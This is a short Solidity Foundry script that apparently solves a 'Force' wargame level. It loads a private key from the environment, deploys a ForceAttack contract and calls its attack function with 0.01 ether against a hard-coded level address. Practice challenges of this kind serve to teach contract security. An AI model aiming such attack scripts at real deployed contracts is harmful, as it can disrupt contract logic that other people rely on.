//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/force/ForceAttack.sol";

contract ForceScript is Script {
    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address levelAddress = 0x775893B251758c4E2715B3D8d1A2F940023d4867;
        ForceAttack forceAttack = new ForceAttack();
        forceAttack.attack{value: 0.01 ether}(payable(levelAddress));
        
        vm.stopBroadcast();
    }
}
